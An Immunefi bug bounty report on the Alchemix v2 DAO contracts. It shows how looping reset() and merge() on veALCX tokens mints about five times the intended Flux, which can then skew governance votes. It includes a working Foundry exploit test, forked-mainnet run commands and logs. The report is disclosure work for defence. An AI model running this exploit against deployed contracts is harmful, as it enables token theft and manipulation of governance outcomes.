# 30925 - \[SC - Critical] Manipulation of governance voting result by unl...

## Manipulation of governance voting result by unlimited minting the Flux Token by exploiting the logic of reset and merge tokenId

Submitted on May 8th 2024 at 11:09:39 UTC by @perseverance for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #30925

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

### Description

## Description

### Brief/Intro

Flux token implements a standard ERC20 token with extra features. Flux tokens are accrued by users of VotingEscrow when voting in the contract Voter. Flux tokens can be used to: i) exit a ve-position early by paying a penalty fee when calling function startCooldown, ii) boost voting power of a NFT holder in contract Voter, or iii) as a normal ERC20 token that can be traded in other systems.

So Flux tokens can be used to boost the voting power of a NFT holder. It is shown in the code of vote() function as below.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol#L228C5-L233C6>

```solidity
function vote(
        uint256 _tokenId,
        address[] calldata _poolVote,
        uint256[] calldata _weights,
        uint256 _boost
    ) external onlyNewEpoch(_tokenId) { {

        // redacted for simplicity

    }
    _vote(_tokenId, _poolVote, _weights, _boost);

```

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol#L412-L455>

```solidity
function _vote(uint256 _tokenId, address[] memory _poolVote, uint256[] memory _weights, uint256 _boost) internal {
        
        
        // redacted for simplicity

        IFluxToken(FLUX).accrueFlux(_tokenId);
        uint256 totalPower = (IVotingEscrow(veALCX).balanceOfToken(_tokenId) + _boost);

    
        // redacted for simplicity
       
        // Update flux balance of token if boost was used
        if (_boost > 0) {
            IFluxToken(FLUX).updateFlux(_tokenId, _boost);
        }
    }
```

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/FluxToken.sol#L195-L199>

```solidity
    function updateFlux(uint256 _tokenId, uint256 _amount) external {
        require(msg.sender == voter, "not voter");
        require(_amount <= unclaimedFlux[_tokenId], "not enough flux");
        unclaimedFlux[_tokenId] -= _amount;
    }

```

So users can boost the voting power up to unclaimedFlux of the tokenId.

The unclaimedFlux\[\_tokenId] is updated in the function accrueFlux()

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/FluxToken.sol#L188C5-L192C6>

```solidity
function accrueFlux(uint256 _tokenId) external {
        require(msg.sender == voter, "not voter");
        uint256 amount = IVotingEscrow(veALCX).claimableFlux(_tokenId);
        unclaimedFlux[_tokenId] += amount;
    }
```

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol#L377-L385>

```solidity
function claimableFlux(uint256 _tokenId) public view returns (uint256) {
        // If the lock is expired, no flux is claimable at the current epoch
        if (block.timestamp > locked[_tokenId].end) {
            return 0;
        }

        // Amount of flux claimable is <fluxPerVeALCX> percent of the balance
        return (_balanceOfTokenAt(_tokenId, block.timestamp) * fluxPerVeALCX) / BPS;
    }
```

So according to the design of the Alchemix DAO system, if an user have a locked tokenID then with balanceA then the user can get maximum Fluxtoken for 1 epoch is

```solidity
    _balanceOfTokenAt(_tokenId, block.timestamp)* fluxPerVeALCX) / BPS 
```

### The vulnerability

#### Vulnerability Details

Now an attacker can mint the several times bigger than the amount of Flux Token for 1 epoch intended by Alchemix by the using the same amount of capital.

So if an user have locked 10 \* 10 \*\* 18 BPT token for 2 weeks, then the maximal amount of flux tokens can be claimed is:

216\_214\_167\_934\_958\_887 = 216 \* 10 \*\* 15 Flux token.

This amount here is just an example.

Attacker can manipulate the system to mint several times to receive about more this amount in 1 epoch. I can demonstrate in the POC, the attacker was able to mint 5 times of the intended amount.

The amount can be minted

```
1189_177_923_641_421_562 = 1189 * 10 ** 15 Flux token
```

By doing so, the attacker can use the Flux token as boost to manipulate the governance voting result by calling the Vote() in Voter contract. Or the attacker can use the unclaimed Flux to mint Flux token.

How to accomplish the exploit of minting?

With an capital (for example 10 \* 10 \*\* 18) The attacker can mint 10 tokenIDs with each lock 10\*\*18 of BPT

The attacker can call the function reset() and merge()

```solidity
        uint index = 0; 
        uint count = 9; 
        uint256 tokenId1; 
        uint256 tokenId2; 
        
        uint256 unclaimedFlux; 

            tokenId1 = createVeAlcx(attacker, TOKEN_1, 2 weeks, false);
          
        for (index = 0; index < count; ++index )
        {   
            console2.log("index: %s", index);
            console2.log("Call voter.reset(tokenId1)"); 
            voter.reset(tokenId1);
            unclaimedFlux = flux.getUnclaimedFlux(tokenId1);
            console2.log("unclaimedFlux of tokenId1: %s", unclaimedFlux);
            console2.log("Call  veALCX.merge() to merge tokenId"); 
            tokenId2 = createVeAlcx(attacker, TOKEN_1, 2 weeks, false);
            veALCX.merge(tokenId1, tokenId2);
            tokenId1 =  tokenId2 ; 
        
        }
        
        voter.reset(tokenId1);
```

Why this is possible?

Step 1: Attacker call reset(tokenId1)

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol#L183C5-L192C6>

```solidity
    /// @inheritdoc IVoter
    function reset(uint256 _tokenId) public onlyNewEpoch(_tokenId) {
        if (msg.sender != admin) {
            require(IVotingEscrow(veALCX).isApprovedOrOwner(msg.sender, _tokenId), "not approved or owner");
        }

        lastVoted[_tokenId] = block.timestamp;
        _reset(_tokenId);
        IVotingEscrow(veALCX).abstain(_tokenId);
        IFluxToken(FLUX).accrueFlux(_tokenId);
    }
```

Since the attacker is the owner of tokenId so this is normal. This call will call accrueFlux function to update the unclaimedFlux for the tokenId.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/FluxToken.sol#L188C5-L192C6>

```solidity
function accrueFlux(uint256 _tokenId) external {
        require(msg.sender == voter, "not voter");
        uint256 amount = IVotingEscrow(veALCX).claimableFlux(_tokenId);
        unclaimedFlux[_tokenId] += amount;
    }
```

Now this tokenId1 has the balanceTokenId1 => unclaimedFlux\[\_tokenId] += balanceTokenId1 \* K

K is explained above.

Step 2: Attacker call function to merge the tokenId1 with tokenId2

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol#L618C5-L651C6>

```solidity
function merge(uint256 _from, uint256 _to) external {
        
        // redacted for simplicity

        uint256 value0 = uint256(_locked0.amount);

        // redacted for simplicity

        IFluxToken(FLUX).mergeFlux(_from, _to);

        // redacted for simplicity
        _burn(_from, value0);
        _depositFor(_to, value0, end, _locked1.maxLockEnabled, _locked1, DepositType.MERGE_TYPE);
    }

```

In function mergeFlux, the unclaimedFlux of tokenId1 is added to unclaimedFlux of tokenId2

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/FluxToken.sol#L180C5-L185C6>

```solidity
function mergeFlux(uint256 _fromTokenId, uint256 _toTokenId) external {
        require(msg.sender == veALCX, "not veALCX");

        unclaimedFlux[_toTokenId] += unclaimedFlux[_fromTokenId];
        unclaimedFlux[_fromTokenId] = 0;
    }

```

You notice that the balance of tokenId2 is also added with balance of tokenId1 in the \_depositFor

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol#L1331>

```solidity
    _locked.amount += _value;
```

So now if the attacker call reset(tokenId2) to accrue the unclaimFlux

The unclaimFlux will be

```
  unclaimedFlux[tokenId2] += unclaimedFlux[tokenId1] +  balanceTokenId2 * K = balanceTokenId1 * K + (balanceTokenId1 + balanceTokenId2) * K = 3 * balanceTokenId1 

```

So you can see that after first loop, the unclaimedFlux is increased abnormally.

By repeating this loop, the attacker will be able to get several times bigger amount of Flux token. In the POC, I demontrated that the attacker can get 5 times bigger by repeating this loop 9 times.

## Impacts

## About the severity assessment

The impact is that the attacker will be able to exploit the system to get several times bigger Flux token for the same capital. For example, in the POC, the attacker can get 5 times bigger with the same capital.

Since the Flux tokens can be used to boost the Voting power in Vote function, the the boost can manipulate the governance voting result. The attacker can also mint Flux token to get benefit as the Flux token can be traded for other assets as stated by the protocol document.

The severity: Critial

Category:

* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results
* Unauthorized or malicious minting of Flux token

Capital for the attack: Gas to execute the transactions. Amount of BPT can be big, the the bigger amount of Flux tokens can be minted, manipulated.

Easy to exploit and easy to be automated.

### Proof of concept

## Proof of concept

The POC code:

```solidity
function testFluxAccrualUnlimited_Hacked() public {
        
        address attacker = address(this); 

        console2.log("Start to create 4 tokenIds by calling createLock with _maxLockEnabled is false and value is 1e18 BPT");

        uint index = 0; 
        uint count = 9; 
        uint256 tokenId1; 
        uint256 tokenId2; 
        
        uint256 unclaimedFlux; 

            tokenId1 = createVeAlcx(attacker, TOKEN_1, 2 weeks, false);
          
        for (index = 0; index < count; ++index )
        {   
            console2.log("index: %s", index);
            console2.log("Call voter.reset(tokenId1)"); 
            voter.reset(tokenId1);
            unclaimedFlux = flux.getUnclaimedFlux(tokenId1);
            console2.log("unclaimedFlux of tokenId1: %s", unclaimedFlux);
            console2.log("Call  veALCX.merge() to merge tokenId"); 
            tokenId2 = createVeAlcx(attacker, TOKEN_1, 2 weeks, false);
            veALCX.merge(tokenId1, tokenId2);
            tokenId1 =  tokenId2 ; 
        
        }
        
        voter.reset(tokenId1);
        
        IVotingEscrow_1.LockedBalance memory _lock = IVotingEscrow_1(address(veALCX)).locked(tokenId1);
               
        console2.log("LockedBalance of tokenId1 lock.amount: %s  ", _lock.amount);
        console2.log("LockedBalance of tokenId1 _lock.end: %s  ", _lock.end);  
        console2.log("LockedBalance of tokenId1 _lock.cooldown: %s  ", _lock.end); 
        console2.log("LockedBalance of tokenId1 _lock.maxLockEnabled: %s  ", _lock.maxLockEnabled); 
        
        unclaimedFlux = flux.getUnclaimedFlux(tokenId1);
        console2.log("unclaimedFlux of tokenId1: %s", unclaimedFlux);
        
        console2.log("After having unclaimFlux, attacker can use to boost voting power or mint Flux token"); 

        console2.log("Flux token balance of the attacker: %s",flux.balanceOf(attacker)); 
        console2.log("Call unclaimedFlux to mint Flux token for the attacker"); 
        flux.claimFlux(tokenId1,unclaimedFlux); 
        console2.log("After claiming: Flux token balance of the attacker: %s",flux.balanceOf(attacker)); 
       
    }
```

In this POC, I use 10 \* 10\*\*18 BPT token. The attacker create 10 tokenIds and repeately call reset(tokenId) and merge

The log shows:

```
[PASS] testFluxAccrualUnlimited_Hacked() (gas: 9917085)
Logs:
  Start to create 4 tokenIds by calling createLock with _maxLockEnabled is false and value is 1e18 BPT
  index: 0
  Call voter.reset(tokenId1)
  unclaimedFlux of tokenId1: 21621416793325425
  Call  veALCX.merge() to merge tokenId
  index: 1
  Call voter.reset(tokenId1)
  unclaimedFlux of tokenId1: 64864250380317202
  Call  veALCX.merge() to merge tokenId
  index: 2
  Call voter.reset(tokenId1)
  unclaimedFlux of tokenId1: 129728500760634405
  Call  veALCX.merge() to merge tokenId
  index: 3
  Call voter.reset(tokenId1)
  unclaimedFlux of tokenId1: 216214167934617960
  Call  veALCX.merge() to merge tokenId
  index: 4
  Call voter.reset(tokenId1)
  unclaimedFlux of tokenId1: 324321251901926940
  Call  veALCX.merge() to merge tokenId
  index: 5
  Call voter.reset(tokenId1)
  unclaimedFlux of tokenId1: 454049752662902272
  Call  veALCX.merge() to merge tokenId
  index: 6
  Call voter.reset(tokenId1)
  unclaimedFlux of tokenId1: 605399670217203030
  Call  veALCX.merge() to merge tokenId
  index: 7
  Call voter.reset(tokenId1)
  unclaimedFlux of tokenId1: 778371004565170140
  Call  veALCX.merge() to merge tokenId
  index: 8
  Call voter.reset(tokenId1)
  unclaimedFlux of tokenId1: 972963755706462675
  Call  veALCX.merge() to merge tokenId
  LockedBalance of tokenId1 lock.amount: 10000000000000000000  
  LockedBalance of tokenId1 _lock.end: 1715817600  
  LockedBalance of tokenId1 _lock.cooldown: 1715817600  
  LockedBalance of tokenId1 _lock.maxLockEnabled: false  
  unclaimedFlux of tokenId1: 1189177923641421562
  After having unclaimFlux, attacker can use to boost voting power or mint Flux token
  Flux token balance of the attacker: 0
  Call unclaimedFlux to mint Flux token for the attacker
  After claiming: Flux token balance of the attacker: 1189177923641421562

```

So at the end of the attack: the attacker still have a tokenId with amount: 10000000000000000000 = 10 \*\* 18 Lock duration: 2 weeks.

So the attacker still can withdraw his capital of BPT token as normal.

The unclaimedFlux of tokenId1: 1189177923641421562

I also created the normal scenario where a user lock 10 \*\* 10\*\*18 BPT token.

```solidity
function testFluxAccrualUnlimited_Normal() public {
        
        address attacker = address(this); 
        console2.log("Start to createLock with _maxLockEnabled is false and value is 1e18 BPT");

        uint256 tokenId1 = createVeAlcx(attacker, 10*TOKEN_1, 2 weeks, false);
                
        IVotingEscrow_1.LockedBalance memory _lock = IVotingEscrow_1(address(veALCX)).locked(tokenId1);
        console2.log("LockedBalance of tokenId1 lock.amount: %s  ", _lock.amount);
        console2.log("LockedBalance of tokenId1 _lock.end: %s  ", _lock.end);  
        console2.log("LockedBalance of tokenId1 _lock.cooldown: %s  ", _lock.end); 
        console2.log("LockedBalance of tokenId1 _lock.maxLockEnabled: %s  ", _lock.maxLockEnabled); 
        
        console2.log("Call voter.reset(tokenId1)");          
        voter.reset(tokenId1);
        uint256 unclaimedFlux = flux.getUnclaimedFlux(tokenId1);
        console2.log("unclaimedFlux1: %s", unclaimedFlux);

        console2.log("After having unclaimFlux, attacker can use to boost voting power or mint Flux token"); 

        console2.log("Flux token balance of the attacker: %s",flux.balanceOf(attacker)); 
        console2.log("Call unclaimedFlux to mint Flux token for the attacker"); 
        flux.claimFlux(tokenId1,unclaimedFlux); 
        console2.log("After claiming: Flux token balance of the attacker: %s",flux.balanceOf(attacker));
        
        uint256 maxVotePower = voter.maxVotingPower(tokenId1);     
        console2.log("maxVotingPower of tokenId1 : %s  ", maxVotePower);         

    }
```

The log of this test case shows:

```

[PASS] testFluxAccrualUnlimited_Normal() (gas: 1310425)
Logs:
  Start to createLock with _maxLockEnabled is false and value is 1e18 BPT
  LockedBalance of tokenId1 lock.amount: 10000000000000000000  
  LockedBalance of tokenId1 _lock.end: 1715817600  
  LockedBalance of tokenId1 _lock.cooldown: 1715817600  
  LockedBalance of tokenId1 _lock.maxLockEnabled: false  
  Call voter.reset(tokenId1)
  unclaimedFlux1: 216214167934958887
  After having unclaimFlux, attacker can use to boost voting power or mint Flux token
  Flux token balance of the attacker: 0
  Call unclaimedFlux to mint Flux token for the attacker
  After claiming: Flux token balance of the attacker: 216214167934958887
  maxVotingPower of tokenId1 : 864856671739835550  


```

So the unclaimedFlux1 of the tokenID1 is 216214167934958887

To compare, the attacker get 5 times bigger

```
1189177923641421562 /  216214167934958887 = 5 
```

So attacker can use the gained Flux token to boost the voting power. In this POC, I demonstrated that the attacker can mint Flux token.

```
   Flux token balance of the attacker: 0
  Call unclaimedFlux to mint Flux token for the attacker
  After claiming: Flux token balance of the attacker: 1189177923641421562

```

To run the test Copy the test code into the file:

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/test/VotingEscrow.t.sol>

and run the test command for the function in the alchemix-v2-dao folder:

```
FOUNDRY_PROFILE=default forge test --fork-url https://rpc.ankr.com/eth --match-path src/test/VotingEscrow.t.sol 
--match-test testFluxAccrualUnlimited  --fork-block-number 19822400 -vv > testFluxAccrualUnlimited_240508_0920.log

```

The full log:

```
Ran 2 tests for src/test/VotingEscrow.t.sol:VotingEscrowTest
[PASS] testFluxAccrualUnlimited_Hacked() (gas: 9917085)
Logs:
  Start to create 4 tokenIds by calling createLock with _maxLockEnabled is false and value is 1e18 BPT
  index: 0
  Call voter.reset(tokenId1)
  unclaimedFlux of tokenId1: 21621416793325425
  Call  veALCX.merge() to merge tokenId
  index: 1
  Call voter.reset(tokenId1)
  unclaimedFlux of tokenId1: 64864250380317202
  Call  veALCX.merge() to merge tokenId
  index: 2
  Call voter.reset(tokenId1)
  unclaimedFlux of tokenId1: 129728500760634405
  Call  veALCX.merge() to merge tokenId
  index: 3
  Call voter.reset(tokenId1)
  unclaimedFlux of tokenId1: 216214167934617960
  Call  veALCX.merge() to merge tokenId
  index: 4
  Call voter.reset(tokenId1)
  unclaimedFlux of tokenId1: 324321251901926940
  Call  veALCX.merge() to merge tokenId
  index: 5
  Call voter.reset(tokenId1)
  unclaimedFlux of tokenId1: 454049752662902272
  Call  veALCX.merge() to merge tokenId
  index: 6
  Call voter.reset(tokenId1)
  unclaimedFlux of tokenId1: 605399670217203030
  Call  veALCX.merge() to merge tokenId
  index: 7
  Call voter.reset(tokenId1)
  unclaimedFlux of tokenId1: 778371004565170140
  Call  veALCX.merge() to merge tokenId
  index: 8
  Call voter.reset(tokenId1)
  unclaimedFlux of tokenId1: 972963755706462675
  Call  veALCX.merge() to merge tokenId
  LockedBalance of tokenId1 lock.amount: 10000000000000000000  
  LockedBalance of tokenId1 _lock.end: 1715817600  
  LockedBalance of tokenId1 _lock.cooldown: 1715817600  
  LockedBalance of tokenId1 _lock.maxLockEnabled: false  
  unclaimedFlux of tokenId1: 1189177923641421562
  After having unclaimFlux, attacker can use to boost voting power or mint Flux token
  Flux token balance of the attacker: 0
  Call unclaimedFlux to mint Flux token for the attacker
  After claiming: Flux token balance of the attacker: 1189177923641421562

[PASS] testFluxAccrualUnlimited_Normal() (gas: 1310425)
Logs:
  Start to createLock with _maxLockEnabled is false and value is 1e18 BPT
  LockedBalance of tokenId1 lock.amount: 10000000000000000000  
  LockedBalance of tokenId1 _lock.end: 1715817600  
  LockedBalance of tokenId1 _lock.cooldown: 1715817600  
  LockedBalance of tokenId1 _lock.maxLockEnabled: false  
  Call voter.reset(tokenId1)
  unclaimedFlux1: 216214167934958887
  After having unclaimFlux, attacker can use to boost voting power or mint Flux token
  Flux token balance of the attacker: 0
  Call unclaimedFlux to mint Flux token for the attacker
  After claiming: Flux token balance of the attacker: 216214167934958887
  maxVotingPower of tokenId1 : 864856671739835550  

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 28.29ms (27.57ms CPU time)

Ran 1 test suite in 694.91ms (28.29ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

The full log file with debug: <https://drive.google.com/file/d/1Zo\\_Osm4rcdqRBumhmvloZdqdzDuCU24f/view?usp=sharing>
